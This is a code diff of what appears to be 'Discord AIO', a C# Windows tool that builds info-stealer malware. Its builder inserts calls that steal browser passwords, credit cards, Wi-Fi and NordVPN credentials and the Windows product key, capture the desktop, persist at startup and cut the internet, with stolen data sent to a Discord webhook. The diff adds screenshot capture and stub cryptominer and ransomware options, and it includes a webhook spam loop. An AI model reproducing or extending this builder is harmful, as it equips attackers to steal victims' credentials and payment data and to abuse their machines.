@@ -27,7 +27,7 @@ namespace discordAIO
     public partial class main : Form
     {
 
-        private string version = "v0.4.0";
+        private string version = "v0.4.1";
         private protected string email = ""; // Your email goes here
 
         // Do not touch
@@ -44,7 +44,6 @@ namespace discordAIO
             builderPage.Visible = false;
             daioPage.Visible = false;
             credentialsPage.Visible = false;
-            ssPage.Visible = false;
 
             label46.Text = version;
 
@@ -168,7 +167,6 @@ namespace discordAIO
             daioPage.Visible = false;
             mainPage.Visible = true;
             credentialsPage.Visible = false;
-            ssPage.Visible = false;
         }
 
         private void button4_Click(object sender, EventArgs e) // Webhooks button
@@ -179,7 +177,6 @@ namespace discordAIO
             builderPage.Visible = false;
             daioPage.Visible = false;
             credentialsPage.Visible = false;
-            ssPage.Visible = false;
         }
 
         // Encryption / Decryption
@@ -345,7 +342,7 @@ namespace discordAIO
                             {
                                 using (HttpRequest req = new HttpRequest())
                                 {
-                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"embeds\":[{\"title\":\"ɴᴜʟʟ ᴄᴏᴍᴍᴜɴɪᴛʏ\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"" + embedColor + "\",\"footer\":{\"text\":\"github.com/Nyxonn\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"url\":\"https://discord.gg/qjrDprutvg\"}}]}", "application/json").ToString();
+                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"avatar_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"embeds\":[{\"title\":\"ɴᴜʟʟ ᴄᴏᴍᴍᴜɴɪᴛʏ\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"" + embedColor + "\",\"footer\":{\"text\":\"github.com/Nyxonn\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"url\":\"https://discord.gg/qjrDprutvg\"}}]}", "application/json").ToString();
                                     Thread.Sleep(2000);
                                 }
                             }
@@ -372,7 +369,7 @@ namespace discordAIO
                             {
                                 using (HttpRequest req = new HttpRequest())
                                 {
-                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"embeds\":[{\"title\":\"ɴᴜʟʟ ᴄᴏᴍᴍᴜɴɪᴛʏ\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"" + embedColor + "\",\"footer\":{\"text\":\"github.com/Nyxonn\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"url\":\"https://discord.gg/qjrDprutvg\"}}]}", "application/json").ToString();
+                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"avatar_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"embeds\":[{\"title\":\"ɴᴜʟʟ ᴄᴏᴍᴍᴜɴɪᴛʏ\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"" + embedColor + "\",\"footer\":{\"text\":\"github.com/Nyxonn\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"url\":\"https://discord.gg/qjrDprutvg\"}}]}", "application/json").ToString();
                                     Thread.Sleep(35);
                                 }
                             }
@@ -534,7 +531,6 @@ namespace discordAIO
             builderPage.Visible = false;
             daioPage.Visible = false;
             credentialsPage.Visible = false;
-            ssPage.Visible = false;
         }
 
         private void button2_Click(object sender, EventArgs e)
@@ -545,7 +541,6 @@ namespace discordAIO
             mainPage.Visible = false;
             daioPage.Visible = false;
             credentialsPage.Visible = false;
-            ssPage.Visible = false;
         }
 
         // Handlers
@@ -598,8 +593,13 @@ namespace discordAIO
                             text = text.Replace("%Guid%", Guid.NewGuid().ToString());
                             text = text.Replace("AIOwebhook", textBox2.Text);
                             label26.Text = "File created. Please wait...";
+                            string embedColor = pictureBox4.BackColor.ToArgb().ToString();
+                            embedColor = embedColor.Remove(0, 1);
                             Thread.Sleep(1000);
                             label26.Text = "Creating additional options...";
+                            // Embed color
+                            text = text.Replace("%selectedColor%", embedColor);
+
                             // Add to Startup
                             if (checkBox1.Checked)
                             {
@@ -648,10 +648,10 @@ namespace discordAIO
                                 text = text.Replace("//killinternet", "KillWIFI();");
                             }
                             // Desktop picture
-                        //    if (bunifuCheckBox9.Checked)
-                        //    {
-                        //        text = text.Replace("//takepic", "TakePicture();");
-                        //    }
+                            if (checkBox21.Checked)
+                            {
+                                text = text.Replace("//takepic", "TakePicture();");
+                            }
                             // Jumpscare
                             if (checkBox8.Checked)
                             {
@@ -661,15 +661,13 @@ namespace discordAIO
                             if (checkBox16.Checked)
                             {
                                 text = text.Replace("//custom", "CustomPlugin();");
-                                text = text.Replace("//customcodehere", scintilla1.Text);
+                                text = text.Replace("//%customcodehere%", scintilla1.Text);
                             }
                             // Windows product key
                             if (checkBox9.Checked)
                             {
                                 text = text.Replace("//winkey", "WinProductKey();");
                             }
-
-
 
                             // Passwords
                             if (checkBox15.Checked)
@@ -692,7 +690,6 @@ namespace discordAIO
                                 text = text.Replace("//stealcreditcard", "Chrome.RunCC();");
                             }
 
-
                             // WIFI passwords
                             if (checkBox10.Checked)
                             {
@@ -704,13 +701,24 @@ namespace discordAIO
                                 text = text.Replace("//stealnord", "NordVPN.Save();");
                             }
 
+                            // Crypto
+                            if (checkBox19.Checked)
+                            {
+                            //    text = text.Replace("//sneakyminer", ""); // TO DO
+                            }
+
+                            // Ransom
+                            if (checkBox20.Checked)
+                            {
+                            //    text = text.Replace("//imransomwr", ""); // TO DO
+                            }
+
                             bool obfuscationCheck = false;
                             // Obfuscation
                             if (checkBox18.Checked)
                             {
                                 obfuscationCheck = true;
                             }
-
 
                             label26.Text = "Additional options created. Compiling...";
                             Thread.Sleep(500);
@@ -1001,22 +1009,6 @@ namespace discordAIO
                         textBox11.Text = macData;
                         textBox13.Text = winkeyData;
 
-
-                        if (decryptedText.Contains("picURL"))
-                        {
-                            link = getBetween(decryptedText, "picURL: ", " |");
-
-                            var request = WebRequest.Create(link);
-
-                            using (var response = request.GetResponse())
-                            using (var stream = response.GetResponseStream())
-                            {
-                                pictureBox5.Invoke(new Action(delegate ()
-                                {
-                                    pictureBox5.Image = Bitmap.FromStream(stream);
-                                }));
-                            }
-                        }
                     }
                 }
             }
@@ -1031,45 +1023,8 @@ namespace discordAIO
             tokensPage.Visible = false;
             webhooksPage.Visible = false;
             mainPage.Visible = false;
-            daioPage.Visible = true;
-        }
-
-        Image zoomImg;
-
-        // SS
-        private void button19_Click(object sender, EventArgs e)
-        {
-            zoomImg = pictureBox5.Image;
-            builderPage.Visible = false;
-            tokensPage.Visible = false;
-            webhooksPage.Visible = false;
-            mainPage.Visible = false;
-            daioPage.Visible = false;
             credentialsPage.Visible = false;
-            ssPage.Visible = true;
-        }
-
-        // Image resizer
-        Image Zoom(Image img, Size size)
-        {
-            Bitmap bmp = new Bitmap(img, img.Width + (img.Width * size.Width / 100), img.Height + (img.Height * size.Height / 100));
-            Graphics g = Graphics.FromImage(bmp);
-            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
-            return bmp;
-        }
-        private void hScrollBar1_Scroll(object sender, ScrollEventArgs e)
-        {
-            if (pictureBox5 == null || pictureBox5.Image == null)
-            {
-            } 
-            else
-            {
-                if (hScrollBar1.Value > 0)
-                {
-                    pictureBox5.Image = Zoom(zoomImg, new Size(hScrollBar1.Value, hScrollBar1.Value));
-                }
-            }
-
+            daioPage.Visible = true;
         }
 
         private void button20_Click(object sender, EventArgs e)
@@ -1079,7 +1034,6 @@ namespace discordAIO
             webhooksPage.Visible = false;
             mainPage.Visible = false;
             daioPage.Visible = false;
-            ssPage.Visible = false;
             credentialsPage.Visible = true;
         }
 
